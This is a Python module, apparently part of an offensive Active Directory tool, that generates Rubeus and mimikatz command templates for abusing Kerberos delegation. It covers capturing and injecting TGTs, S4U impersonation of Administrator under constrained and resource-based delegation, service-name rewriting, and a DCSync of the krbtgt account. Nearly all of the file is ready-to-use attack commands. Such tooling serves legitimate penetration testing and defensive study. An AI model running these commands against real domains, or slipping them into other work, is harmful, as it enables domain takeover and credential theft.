"""Rubeus command templates for delegation abuse (Windows toolset)."""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from sharpgate.analyser.models import DelegationFinding


def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
    """Unconstrained delegation: monitor for TGTs with Rubeus."""
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": f"Monitor for incoming TGTs on {target}",
            "prereq": f"Local admin on {target}",
            "command": (
                f"Rubeus.exe monitor /interval:5 /nowrap"
            ),
            "notes": [
                f"Run on {target} to capture TGTs from authenticating users.",
                "Use /filteruser:DC$ to only capture DC TGTs.",
                "/nowrap prevents line wrapping of base64 tickets.",
            ],
        },
        {
            "step": 2,
            "title": "Extract TGT using tgtdeleg (alternative)",
            "command": (
                "Rubeus.exe tgtdeleg /nowrap"
            ),
            "notes": [
                "tgtdeleg extracts a usable TGT from the current logon session.",
                "Useful as an alternative to monitoring when you have a session.",
            ],
        },
        {
            "step": 3,
            "title": "Pass the captured ticket",
            "prereq": "Base64 ticket from step 1 or 2",
            "command": (
                "Rubeus.exe ptt /ticket:<BASE64_TICKET>"
            ),
            "notes": [
                "Injects the captured TGT into the current session.",
                "Then use standard tools (mimikatz DCSync, etc.) with the injected ticket.",
            ],
        },
    ]


def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained delegation with T2A4D: Rubeus S4U."""
    domain = finding.domain.lower()
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    steps = [
        {
            "step": 1,
            "title": f"S4U attack to impersonate Administrator to {spn}",
            "prereq": f"RC4/AES hash of {account}",
            "command": (
                f"Rubeus.exe s4u /user:{account} /rc4:<NTLM_HASH> "
                f"/impersonateuser:Administrator /msdsspn:\"{spn}\" /ptt"
            ),
            "notes": [
                "Uses S4U2Self + S4U2Proxy with protocol transition.",
                "/ptt injects the ticket directly into the session.",
                "Use /aes256:<KEY> instead of /rc4 for AES.",
                "Use /domain:DOMAIN if not in the same domain context.",
            ],
        },
    ]

    # Alternative service name trick
    if finding.allowed_services:
        svc = finding.allowed_services[0]
        if svc.service_type in ("HTTP", "CIFS", "HOST", "WSMAN"):
            alt_svc = "CIFS" if svc.service_type != "CIFS" else "HTTP"
            steps.append({
                "step": 2,
                "title": "Alternative service name trick",
                "command": (
                    f"Rubeus.exe s4u /user:{account} /rc4:<NTLM_HASH> "
                    f"/impersonateuser:Administrator /msdsspn:\"{spn}\" "
                    f"/altservice:{alt_svc} /ptt"
                ),
                "notes": [
                    f"Rewrites service type to {alt_svc} for broader access.",
                    "Can chain multiple: /altservice:CIFS,HTTP,LDAP,HOST",
                ],
            })

    steps.append({
        "step": len(steps) + 1,
        "title": "DCSync via LDAP rewrite (if target is DC)",
        "command": (
            f"Rubeus.exe s4u /user:{account} /rc4:<NTLM_HASH> "
            f"/impersonateuser:Administrator /msdsspn:\"{spn}\" "
            f"/altservice:LDAP /ptt\n\n"
            f"# Then DCSync:\n"
            f"mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:krbtgt\""
        ),
        "notes": [
            "Rewrite to LDAP service for DCSync access.",
            "Only effective if the target host is a DC.",
        ],
    })

    return steps


def constrained_no_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained delegation without T2A4D: needs additional ticket."""
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    return [
        {
            "step": 1,
            "title": f"S4U2Proxy with existing TGS to {spn}",
            "prereq": f"RC4/AES hash of {account} + forwardable TGS",
            "command": (
                f"Rubeus.exe s4u /user:{account} /rc4:<NTLM_HASH> "
                f"/impersonateuser:Administrator /msdsspn:\"{spn}\" "
                f"/tgs:<BASE64_TGS> /ptt"
            ),
            "notes": [
                "Without T2A4D, need a valid forwardable service ticket.",
                "The /tgs parameter provides the pre-existing ticket.",
                "Capture a forwardable ticket from an unconstrained delegation host.",
            ],
        },
    ]


def rbcd_existing(finding: DelegationFinding) -> list[dict]:
    """RBCD existing: S4U from allowed principal."""
    target = finding.samaccountname
    principal = (
        finding.rbcd_principals[0].samaccountname
        if finding.rbcd_principals
        else "ALLOWED_PRINCIPAL$"
    )

    return [
        {
            "step": 1,
            "title": f"S4U from {principal} to {target}",
            "prereq": f"RC4/AES hash of {principal}",
            "command": (
                f"Rubeus.exe s4u /user:{principal} /rc4:<NTLM_HASH> "
                f"/impersonateuser:Administrator /msdsspn:\"CIFS/{target}\" /ptt"
            ),
            "notes": [
                f"{principal} is in {target}'s RBCD allowlist.",
                "RBCD S4U works even without an SPN on the allowed principal.",
            ],
        },
    ]


def rbcd_setup(finding: DelegationFinding) -> list[dict]:
    """RBCD setup: Rubeus S4U after configuring RBCD."""
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": f"S4U from YOURPC$ to {target} (after RBCD setup)",
            "prereq": "RBCD attribute configured on target + machine account created",
            "command": (
                f"Rubeus.exe s4u /user:YOURPC$ /rc4:<YOURPC_HASH> "
                f"/impersonateuser:Administrator /msdsspn:\"CIFS/{target}\" /ptt"
            ),
            "notes": [
                "Use after setting up the RBCD attribute with PowerView or StandIn.",
                "The machine account hash is the NTLM of the password you set.",
            ],
        },
    ]


def tgtdeleg(finding: DelegationFinding) -> list[dict]:
    """Extract usable TGT via tgtdeleg trick."""
    return [
        {
            "step": 1,
            "title": "Extract TGT via Kerberos delegation trick",
            "command": "Rubeus.exe tgtdeleg /nowrap",
            "notes": [
                "Requests a delegated TGT that can be used for further attacks.",
                "Does not require elevation.",
            ],
        },
    ]


RUBEUS_COMMANDS = {
    "unconstrained_coerce": unconstrained_coerce,
    "constrained_t2a4d": constrained_t2a4d,
    "constrained_no_t2a4d": constrained_no_t2a4d,
    "rbcd_existing": rbcd_existing,
    "rbcd_setup": rbcd_setup,
    "tgtdeleg": tgtdeleg,
}
